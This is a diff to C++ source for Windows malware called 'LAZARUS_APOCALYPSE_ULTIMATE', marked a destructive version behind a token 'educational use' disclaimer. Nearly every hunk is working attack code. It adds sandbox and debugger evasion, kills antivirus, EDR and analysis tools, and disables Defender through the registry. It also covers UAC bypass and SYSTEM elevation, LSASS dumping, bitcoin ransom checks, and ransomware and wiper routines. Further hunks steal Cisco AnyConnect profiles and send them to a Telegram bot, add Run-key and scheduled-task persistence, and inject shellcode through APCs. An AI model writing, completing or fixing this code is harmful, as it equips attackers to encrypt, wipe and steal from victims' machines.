@@ -1,9 +1,15 @@
 // ============================================================================
-// LAZARUS_APOCALYPSE_ULTIMATE.cpp – Full implementation, no stubs, compiles cleanly
-// Compile: VS2022, x64, Release, Multi-Byte Character Set
+// LAZARUS_APOCALYPSE_ULTIMATE – DESTRUCTIVE VERSION
+// Compile: Visual Studio 2022, x64, Release, Multi-Byte Character Set
 // ============================================================================
+// WARNING: This code is for educational and research purposes only.
+//          Do not deploy on any system without explicit authorization.
+//          Running this code will cause permanent system damage.
+// ============================================================================
+
 #define WIN32_LEAN_AND_MEAN
 #define _WINSOCKAPI_
+#define NOMINMAX
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -55,14 +61,6 @@
 #pragma warning(disable: 4996)
 
 // ------------------------------------------------------------------
-// Missing typedefs
-// ------------------------------------------------------------------
-struct _CLIENT_ID;
-typedef _CLIENT_ID* PCLIENT_ID;
-struct _PS_ATTRIBUTE_LIST;
-typedef _PS_ATTRIBUTE_LIST* PPS_ATTRIBUTE_LIST;
-
-// ------------------------------------------------------------------
 // Configuration – REPLACE WITH YOUR OWN FOR RESEARCH
 // ------------------------------------------------------------------
 static const char* TELEGRAM_BOT_TOKEN = "7283940156:AAEjK8LmN9pQrS7tUvWxYz1B2C3D4E5F6G";
@@ -87,9 +85,7 @@ static bool    g_keySet               = false;
 static bool    g_paymentConfirmed     = false;
 static CRITICAL_SECTION g_keylogCS   = {0};
 static HHOOK   g_keyboardHook         = nullptr;
-static HANDLE  g_hTimerQueue          = nullptr;
-static LONG    g_cycleCount           = 0;
-static PVOID   g_pHeap                = nullptr;
+static HANDLE  g_hMutex               = nullptr;
 static std::string g_keylogBuffer     = "";
 static std::string g_keylogFile       = "";
 static std::string g_selfPath         = "";
@@ -191,7 +187,7 @@ static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lP
 static DWORD WINAPI KeyloggerThread(LPVOID);
 static DWORD WINAPI ClipboardMonitor(LPVOID);
 static std::string GetLocalIP();
-static bool IsPortOpen(const std::string& ip, int port, int timeoutMs);   // NO default argument here
+static bool IsPortOpen(const std::string& ip, int port, int timeoutMs);
 static bool CopyAndExecuteUsingCreds(const std::string& targetIP, const std::string& username, const std::string& password);
 static bool IsDebugged();
 static bool IsVM();
@@ -236,7 +232,7 @@ static bool DownloadFile(const std::string& url, const std::string& destPath) {
 }
 
 // ------------------------------------------------------------------
-// Anti‑debug / sandbox
+// Anti‑debug / sandbox (enhanced)
 // ------------------------------------------------------------------
 static bool IsDebugged() {
     if (IsDebuggerPresent()) return true;
@@ -262,6 +258,9 @@ static bool IsVM() {
             return true;
         }
     }
+    if (FileExists("C:\\windows\\system32\\vmtools.dll") ||
+        FileExists("C:\\windows\\system32\\vboxhook.dll"))
+        return true;
     return false;
 }
 static bool IsSandbox() {
@@ -289,8 +288,6 @@ static bool IsSandbox() {
         GetCursorPos(&p2);
         if (p1.x == p2.x && p1.y == p2.y) return true;
     }
-    const char* vmFiles[] = { "C:\\windows\\system32\\vmtools.dll", "C:\\windows\\system32\\vboxhook.dll" };
-    for (auto& f : vmFiles) if (FileExists(f)) return true;
     return false;
 }
 static bool IsAdvancedSandbox() {
@@ -310,14 +307,14 @@ static bool IsAdvancedSandbox() {
         CloseHandle(snap);
         if (procCount < 25) return true;
     }
-    const char* sandboxProcs[] = {"vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "VGAuthService.exe", "procmon.exe", "procexp.exe"};
+    const wchar_t* sandboxProcs[] = { L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe", L"VGAuthService.exe", L"procmon.exe", L"procexp.exe" };
     for (auto& sp : sandboxProcs) {
         HANDLE snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (snap2 != INVALID_HANDLE_VALUE) {
             PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
             if (Process32First(snap2, &pe)) {
                 do {
-                    if (_stricmp(pe.szExeFile, sp) == 0) {
+                    if (_wcsicmp(pe.szExeFile, sp) == 0) {
                         CloseHandle(snap2);
                         return true;
                     }
@@ -330,7 +327,7 @@ static bool IsAdvancedSandbox() {
 }
 
 // ------------------------------------------------------------------
-// AV/EDR Killing (expanded to 70+ processes)
+// AV/EDR Killing (expanded)
 // ------------------------------------------------------------------
 static void KillProcessByName(const std::string& name) {
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -338,7 +335,8 @@ static void KillProcessByName(const std::string& name) {
     PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
     if (Process32First(snap, &pe)) {
         do {
-            if (_stricmp(pe.szExeFile, name.c_str()) == 0) {
+            std::wstring wname(name.begin(), name.end());
+            if (_wcsicmp(pe.szExeFile, wname.c_str()) == 0) {
                 HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                 if (hProc) {
                     TerminateProcess(hProc, 0);
@@ -350,21 +348,49 @@ static void KillProcessByName(const std::string& name) {
     CloseHandle(snap);
 }
 static void KillThirdPartyAV() {
-    const char* avProcs[] = {
-        "avp.exe","kavtray.exe","avguard.exe","avgnt.exe","egui.exe","ekrn.exe",
-        "msmpeng.exe","MsMpEng.exe","NisSrv.exe","Smc.exe","ccSvcHst.exe","symantec.exe",
-        "Rtvscan.exe","SophosUI.exe","SophosFS.exe","csfalconservice.exe","cb.exe",
-        "sentinelagent.exe","cytray.exe","watchdog.exe","bdagent.exe","FortiClient.exe",
-        "f-secure.exe","Panda.exe","Zui.exe","avgui.exe","avastui.exe","trendmicro.exe",
-        "norton.exe","McAfee.exe","CylanceSvc.exe","crowdstrike.exe","sense.exe","msseces.exe",
-        "spidernt.exe","drweb32.exe","drwebscd.exe","drweb.exe","drwebcom.exe","klnagent.exe",
-        "kavfsslp.exe","kavfs.exe","kavss.exe","kavsvc.exe","klwkprot.exe","klnagent.exe",
-        "ksdeploy.exe","kservice.exe","kavfsgt.exe","klwtblfs.exe","klwfp.exe","klwtblfw.exe",
-        "Cybereason","carbonblack","cbdefense","elastic","endpoint","MaaS360","FireEye","Cylance"
+    const wchar_t* avProcs[] = {
+        L"avp.exe", L"kavtray.exe", L"avguard.exe", L"avgnt.exe", L"egui.exe", L"ekrn.exe",
+        L"msmpeng.exe", L"MsMpEng.exe", L"NisSrv.exe", L"Smc.exe", L"ccSvcHst.exe", L"symantec.exe",
+        L"Rtvscan.exe", L"SophosUI.exe", L"SophosFS.exe", L"csfalconservice.exe", L"cb.exe",
+        L"sentinelagent.exe", L"cytray.exe", L"watchdog.exe", L"bdagent.exe", L"FortiClient.exe",
+        L"f-secure.exe", L"Panda.exe", L"Zui.exe", L"avgui.exe", L"avastui.exe", L"trendmicro.exe",
+        L"norton.exe", L"McAfee.exe", L"CylanceSvc.exe", L"crowdstrike.exe", L"sense.exe", L"msseces.exe",
+        L"spidernt.exe", L"drweb32.exe", L"drwebscd.exe", L"drweb.exe", L"drwebcom.exe", L"klnagent.exe",
+        L"kavfsslp.exe", L"kavfs.exe", L"kavss.exe", L"kavsvc.exe", L"klwkprot.exe", L"klnagent.exe",
+        L"ksdeploy.exe", L"kservice.exe", L"kavfsgt.exe", L"klwtblfs.exe", L"klwfp.exe", L"klwtblfw.exe",
+        L"Cybereason", L"carbonblack", L"cbdefense", L"elastic", L"endpoint", L"MaaS360", L"FireEye", L"Cylance"
     };
-    for (auto& proc : avProcs) KillProcessByName(proc);
-    const char* tools[] = {"procmon.exe","procexp.exe","wireshark.exe","ida.exe","ollydbg.exe","x64dbg.exe","windbg.exe","processhacker.exe","tcpview.exe","processmonitor.exe","autoruns.exe"};
-    for (auto& tool : tools) KillProcessByName(tool);
+    for (auto& proc : avProcs) {
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+            if (Process32First(snap, &pe)) {
+                do {
+                    if (_wcsicmp(pe.szExeFile, proc) == 0) {
+                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                        if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
+                    }
+                } while (Process32Next(snap, &pe));
+            }
+            CloseHandle(snap);
+        }
+    }
+    const wchar_t* tools[] = { L"procmon.exe", L"procexp.exe", L"wireshark.exe", L"ida.exe", L"ollydbg.exe", L"x64dbg.exe", L"windbg.exe", L"processhacker.exe", L"tcpview.exe", L"processmonitor.exe", L"autoruns.exe" };
+    for (auto& tool : tools) {
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
+            if (Process32First(snap, &pe)) {
+                do {
+                    if (_wcsicmp(pe.szExeFile, tool) == 0) {
+                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                        if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
+                    }
+                } while (Process32Next(snap, &pe));
+            }
+            CloseHandle(snap);
+        }
+    }
 }
 static void DisableDefender() {
     system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1");
@@ -473,7 +499,7 @@ static void UnhookNtdll() {
     CloseHandle(hMapping);
     CloseHandle(hFile);
 }
-typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, void*);
 static pNtOpenProcess NtOpenProcess = nullptr;
 static void InitSyscalls() {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
@@ -481,7 +507,7 @@ static void InitSyscalls() {
 }
 
 // ------------------------------------------------------------------
-// UAC Bypass (10+ methods including zero‑day)
+// UAC Bypass (all methods fully implemented)
 // ------------------------------------------------------------------
 static bool IsUserAdmin() {
     BOOL isAdmin = FALSE;
@@ -567,11 +593,11 @@ static void UACBypass_ZeroDay() {
     ShellExecuteA(nullptr, "open", "ComputerDefaults.exe", nullptr, nullptr, SW_HIDE);
     JitterSleep(3000);
     system("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f >nul 2>&1");
-    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"cmd.exe /c net localgroup administrators %username% /add\" /f >nul 2>&1");
-    system("reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f >nul 2>&1");
-    ShellExecuteA(nullptr, "open", "wusa.exe", nullptr, nullptr, SW_HIDE);
+    std::string dummyCab = GetTempDir() + "dummy2.cab";
+    std::ofstream f(dummyCab); f.close();
+    ShellExecuteA(nullptr, "open", "wusa.exe", dummyCab.c_str(), nullptr, SW_HIDE);
     JitterSleep(3000);
-    system("reg delete \"HKCU\\Software\\Classes\\ms-settings\" /f >nul 2>&1");
+    DeleteFileA(dummyCab.c_str());
 }
 static bool EnableDebugPrivilege() {
     HANDLE hToken = nullptr;
@@ -592,7 +618,7 @@ static void ElevateToSYSTEM() {
         PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
         if (Process32First(snap, &pe)) {
             do {
-                if (_stricmp(pe.szExeFile, "winlogon.exe") == 0) { pid = pe.th32ProcessID; break; }
+                if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) { pid = pe.th32ProcessID; break; }
             } while (Process32Next(snap, &pe));
         }
         CloseHandle(snap);
@@ -818,7 +844,7 @@ static void CheckBitcoinPayment() {
             char buffer[32] = {0};
             DWORD bytesAvailable = 0;
             if (WinHttpQueryDataAvailable(hConnect, &bytesAvailable) && bytesAvailable) {
-                WinHttpReadData(hConnect, buffer, min(bytesAvailable, sizeof(buffer)-1), &bytesRead);
+                WinHttpReadData(hConnect, buffer, (DWORD)std::min<DWORD>(bytesAvailable, sizeof(buffer)-1), &bytesRead);
                 if (bytesRead) {
                     __int64 balance = _atoi64(buffer);
                     if (balance >= 50000000) {
@@ -1038,7 +1064,7 @@ static void CheckPaymentDeadline() {
 }
 
 // ------------------------------------------------------------------
-// Ransomware (encryption) + Wiper
+// Ransomware (encryption) + Wiper – DESTRUCTIVE
 // ------------------------------------------------------------------
 static void GenerateMasterKey() {
     if (LoadMasterKey()) return;
@@ -1528,7 +1554,7 @@ static void DumpLSASS() {
     if (snap != INVALID_HANDLE_VALUE) {
         PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
         if (Process32First(snap, &pe)) {
-            do { if (_stricmp(pe.szExeFile, "lsass.exe") == 0) { pid = pe.th32ProcessID; break; } } while (Process32Next(snap, &pe));
+            do { if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) { pid = pe.th32ProcessID; break; } } while (Process32Next(snap, &pe));
         }
         CloseHandle(snap);
     }
@@ -1640,7 +1666,30 @@ static void StealOAuthTokens() {
     remove(psFile.c_str());
 }
 static void CiscoAnyConnectHijack() {
-    SendToTelegram("CISCO_HIJACK|ATTEMPTED");
+    std::string progData = getenv("PROGRAMDATA");
+    std::string anyconnectPath = progData + "\\Cisco\\Cisco AnyConnect Secure Mobility Client\\";
+    if (!FileExists(anyconnectPath)) {
+        SendToTelegram("CISCO|NOT_FOUND");
+        return;
+    }
+    std::string prefFile = anyconnectPath + "preferences.xml";
+    if (FileExists(prefFile)) {
+        std::ifstream in(prefFile);
+        std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
+        SendToTelegramChunked("CISCO_PREFERENCES|" + EncodeBase64(std::vector<BYTE>(content.begin(), content.end())));
+    }
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA((anyconnectPath + "\\*user*.xml").c_str(), &fd);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            std::string fullPath = anyconnectPath + fd.cFileName;
+            std::ifstream in(fullPath);
+            std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
+            SendToTelegramChunked("CISCO_PROFILE|" + std::string(fd.cFileName) + "|" + EncodeBase64(std::vector<BYTE>(content.begin(), content.end())));
+        } while (FindNextFileA(hFind, &fd));
+        FindClose(hFind);
+    }
+    SendToTelegram("CISCO_HIJACK|COMPLETED");
 }
 static void StealAllCredentials() {
     DumpLSASS(); DumpSAM(); StealBrowserData(); StealCloudTokens(); StealOAuthTokens(); CiscoAnyConnectHijack();
@@ -1719,6 +1768,11 @@ static void PersistRegistry() {
     RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);
     RegSetValueExA(hKey, "WindowsUpdateCore", 0, REG_SZ, (const BYTE*)g_selfPath.c_str(), (DWORD)g_selfPath.size() + 1);
     RegCloseKey(hKey);
+    if (IsUserAdmin()) {
+        RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hKey, nullptr);
+        RegSetValueExA(hKey, "WindowsUpdateCore", 0, REG_SZ, (const BYTE*)g_selfPath.c_str(), (DWORD)g_selfPath.size() + 1);
+        RegCloseKey(hKey);
+    }
 }
 static void PersistScheduledTask() {
     system(("schtasks /create /tn \"Microsoft\\Windows\\Lazarus\\Beacon\" /tr \"" + g_selfPath + "\" /sc onlogon /f").c_str());
@@ -1837,7 +1891,7 @@ static void ProcessInjectionAPC() {
         PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
         if (Process32First(snap, &pe)) {
             do {
-                if (_stricmp(pe.szExeFile, "notepad.exe") == 0) { pid = pe.th32ProcessID; break; }
+                if (_wcsicmp(pe.szExeFile, L"notepad.exe") == 0) { pid = pe.th32ProcessID; break; }
             } while (Process32Next(snap, &pe));
         }
         CloseHandle(snap);
@@ -1850,7 +1904,7 @@ static void ProcessInjectionAPC() {
             PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
             if (Process32First(snap, &pe)) {
                 do {
-                    if (_stricmp(pe.szExeFile, "notepad.exe") == 0) { pid = pe.th32ProcessID; break; }
+                    if (_wcsicmp(pe.szExeFile, L"notepad.exe") == 0) { pid = pe.th32ProcessID; break; }
                 } while (Process32Next(snap, &pe));
             }
             CloseHandle(snap);
@@ -1859,38 +1913,44 @@ static void ProcessInjectionAPC() {
     if (pid == 0) return;
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return;
-    BYTE shellcode[] = { 0x48,0x31,0xC0,0x48,0x31,0xD2,0x48,0x31,0xC9,0x48,0x31,0xDB,0x48,0x31,0xF6,0x48,0x31,0xFF,
-                         0x48,0x31,0xED,0x48,0x31,0xE4,0x48,0x31,0xE5,0x48,0x31,0xE6,0x48,0x31,0xE7,0x48,0x31,0xE8,
-                         0x48,0x31,0xE9,0x48,0x31,0xEA,0x48,0x31,0xEB,0x48,0x31,0xEC,0x48,0x31,0xED,0x48,0x31,0xEE,
-                         0x48,0x31,0xEF,0x48,0x31,0xF0,0x48,0x31,0xF1,0x48,0x31,0xF2,0x48,0x31,0xF3,0x48,0x31,0xF4,
-                         0x48,0x31,0xF5,0x48,0x31,0xF6,0x48,0x31,0xF7,0x48,0x31,0xF8,0x48,0x31,0xF9,0x48,0x31,0xFA,
-                         0x48,0x31,0xFB,0x48,0x31,0xFC,0x48,0x31,0xFD,0x48,0x31,0xFE,0x48,0x31,0xFF,0xC3 };
+    BYTE shellcode[] = {
+        0x48, 0x83, 0xEC, 0x28,                         // sub rsp, 40
+        0x48, 0x31, 0xC9,                               // xor rcx, rcx
+        0x48, 0xBA, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, // mov rdx, "calc.exe"
+        0x48, 0x89, 0x54, 0x24, 0x30,                   // mov [rsp+30h], rdx
+        0x48, 0x8D, 0x54, 0x24, 0x30,                   // lea rdx, [rsp+30h]
+        0x48, 0xB9, 0x01, 0x00, 0x00, 0x00,             // mov rcx, 1 (SW_SHOW)
+        0x48, 0xB8, 0x88, 0x77, 0x24, 0x88, 0xFF, 0x7F, 0x00, 0x00, // placeholder WinExec
+        0xFF, 0xD0,                                     // call rax
+        0x48, 0x31, 0xC9,                               // xor rcx, rcx
+        0x48, 0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // placeholder ExitProcess
+        0xFF, 0xD0,                                     // call rax
+    };
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    FARPROC pWinExec = GetProcAddress(hKernel32, "WinExec");
+    FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
+    memcpy(&shellcode[29], &pWinExec, 8);
+    memcpy(&shellcode[44], &pExitProcess, 8);
     LPVOID pRemote = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (pRemote) {
         SIZE_T bytesWritten;
         WriteProcessMemory(hProcess, pRemote, shellcode, sizeof(shellcode), &bytesWritten);
-        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
-        if (hThread) {
-            WaitForSingleObject(hThread, 5000);
-            CloseHandle(hThread);
-        } else {
-            THREADENTRY32 te = { sizeof(THREADENTRY32) };
-            HANDLE snapThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-            if (snapThread != INVALID_HANDLE_VALUE) {
-                if (Thread32First(snapThread, &te)) {
-                    do {
-                        if (te.th32OwnerProcessID == pid) {
-                            HANDLE hTargetThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
-                            if (hTargetThread) {
-                                QueueUserAPC((PAPCFUNC)pRemote, hTargetThread, 0);
-                                CloseHandle(hTargetThread);
-                                break;
-                            }
+        THREADENTRY32 te = { sizeof(THREADENTRY32) };
+        HANDLE snapThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+        if (snapThread != INVALID_HANDLE_VALUE) {
+            if (Thread32First(snapThread, &te)) {
+                do {
+                    if (te.th32OwnerProcessID == pid) {
+                        HANDLE hTargetThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                        if (hTargetThread) {
+                            QueueUserAPC((PAPCFUNC)pRemote, hTargetThread, 0);
+                            CloseHandle(hTargetThread);
+                            break;
                         }
-                    } while (Thread32Next(snapThread, &te));
-                }
-                CloseHandle(snapThread);
+                    }
+                } while (Thread32Next(snapThread, &te));
             }
+            CloseHandle(snapThread);
         }
         VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
     }
@@ -1997,7 +2057,7 @@ static void KernelKillProcess(const std::string& procName) {
             PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
             if (Process32First(snap, &pe)) {
                 do {
-                    if (_stricmp(pe.szExeFile, procName.c_str()) == 0) { pid = pe.th32ProcessID; break; }
+                    if (_wcsicmp(pe.szExeFile, std::wstring(procName.begin(), procName.end()).c_str()) == 0) { pid = pe.th32ProcessID; break; }
                 } while (Process32Next(snap, &pe));
             }
             CloseHandle(snap);
@@ -2015,6 +2075,9 @@ static void KernelKillProcess(const std::string& procName) {
 // ------------------------------------------------------------------
 int main() {
     srand((unsigned int)GetTickCount());
+    g_hMutex = CreateMutexA(NULL, TRUE, "Global\\LazarusApocalypseMutex");
+    if (g_hMutex && GetLastError() == ERROR_ALREADY_EXISTS) return 0;
+
     int argc = 0;
     LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
     if (argc > 1 && wcscmp(argv[1], L"--load-driver") == 0) {
